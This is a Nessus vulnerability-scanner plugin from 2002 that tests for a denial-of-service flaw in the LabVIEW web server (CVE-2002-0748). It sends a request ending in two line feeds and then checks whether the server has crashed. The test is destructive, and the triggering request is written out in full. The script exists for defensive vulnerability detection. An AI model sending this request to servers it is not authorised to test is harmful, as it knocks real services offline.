#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# From: "Steve Zins" <steve@iLabVIEW.com>
# To: bugtraq@securityfocus.com
# Subject: LabVIEW Web Server DoS Vulnerability
# Date: Mon, 22 Apr 2002 22:51:39 -0700
#

if(description)
{
 script_id(11063);
 script_bugtraq_id(4577);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2002-0748");
 name["english"] = "LabView web server DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending a request that ends with two LF characters instead of 
the normal sequence CR LF CR LF 
(CR = carriage return, LF = line feed).

A cracker may exploit this vulnerability to make this server and
all LabViews applications crash continually.

Workaround : upgrade your LabView software or run the web server with logging
disabled

Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "Kills the LabView web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "http_version.nasl");
 exit(0);
}

########


include("http_func.inc");

data = string("GET / HTTP/1.0\n\n");

port = get_http_port(default:80);

if(get_port_state(port))
{
  soc = http_open_socket(port);
  if(soc)
  {
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  close(soc);
  sleep(1);
  soc2 = open_sock_tcp(port);
  #display(string("Alive!\n"));
  if(!soc2)security_hole(port);
  else close(soc2);
  }
}
